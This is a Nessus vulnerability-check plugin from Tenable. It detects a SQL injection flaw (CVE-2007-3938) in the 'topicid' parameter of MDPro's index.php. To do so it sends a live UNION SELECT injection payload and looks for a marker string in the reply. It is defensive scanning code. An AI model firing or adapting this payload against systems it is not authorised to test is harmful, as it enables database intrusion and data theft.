#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25993);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2007-3938");
  script_bugtraq_id(24969);
  script_osvdb_id(36336);
  script_xref(name:"EDB-ID", value:"4199");

  script_name(english:"MDPro index.php topicid Parameter SQL Injection");
  script_summary(english:"Tries to manipulate a topic name");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running MDPro, an open source content management
system written in PHP. 

The version of MDPro installed on the remote host fails to sanitize
user input to the 'topicid' parameter before using it in the
'topics_userapi_get' function in 'modules/Topics/pnuserapi.php' to
generate database queries.  An unauthenticated attacker can exploit
this issue to manipulate those queries, which could lead to disclosure
of sensitive information, modification of data, or attacks against the
underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/09/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/07/18");
 script_cvs_date("$Date: 2016/05/20 14:12:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:maxdev:mdpro");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/mdpro", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to manipulate a topic name.
  magic = string(SCRIPT_NAME, "-", unixtime());
  exploit = string("-1 UNION SELECT null,null,'", magic, "',null,null,null,null --");
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "module=Topics&",
      "func=view&",
      "topicid=", urlencode(str:exploit)
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # If it looks like the exploit worked...
  if (string('ALT="', magic, '"') >< res)
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
